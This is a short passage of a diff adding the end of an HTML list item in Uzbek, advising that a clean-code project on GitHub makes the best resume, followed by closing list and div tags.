+  va GitHub'da toza kodli loyiha — eng yaxshi rezyume.</li>
+</ul>
+</div>
